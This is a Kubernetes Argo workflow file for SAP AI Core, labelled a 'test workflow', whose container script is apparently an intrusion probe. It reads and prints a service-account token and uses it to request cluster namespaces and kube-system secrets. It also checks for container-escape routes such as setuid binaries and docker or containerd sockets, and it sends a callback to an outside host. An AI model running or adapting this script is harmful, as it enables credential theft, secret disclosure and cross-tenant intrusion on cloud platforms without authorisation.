apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "39.0.0"
spec:
  entrypoint: main
  volumes:
  - name: projected-token
    projected:
      sources:
      - serviceAccountToken:
          path: token
          expirationSeconds: 3600
          audience: api
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      volumeMounts:
      - name: projected-token
        mountPath: /var/run/projected
      command:
      - bash
      - -c
      - |
        echo "=== V39 CROSS-NS REFERENCE ==="
        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo unknown)
        echo "NS: $NS"
        echo "=== PROJECTED TOKEN ==="
        ls -la /var/run/projected/ 2>/dev/null || echo "Mount failed"
        PTOKEN=$(cat /var/run/projected/token 2>/dev/null)
        echo "Len: ${#PTOKEN}"
        if [ -n "$PTOKEN" ]; then
          echo "GOT TOKEN"
          echo "$PTOKEN" | head -c 200
          echo ""
          curl -sk -H "Authorization: Bearer $PTOKEN" https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -c 400
          echo ""
          curl -sk -H "Authorization: Bearer $PTOKEN" https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets 2>&1 | head -c 400
        fi
        echo "=== ESCAPE ==="
        find / -perm -4000 2>/dev/null | head -3
        ls /run/containerd/containerd.sock /var/run/docker.sock 2>/dev/null || echo "No sockets"
        cat /proc/self/uid_map 2>/dev/null
        mount | grep -v "proc\|sys\|dev\|overlay\|tmpfs" | head -3
        curl -s "https://www.masonhck.tech/ssrf.php?src=v39" | head -c 5
        echo "=== V39 DONE ==="
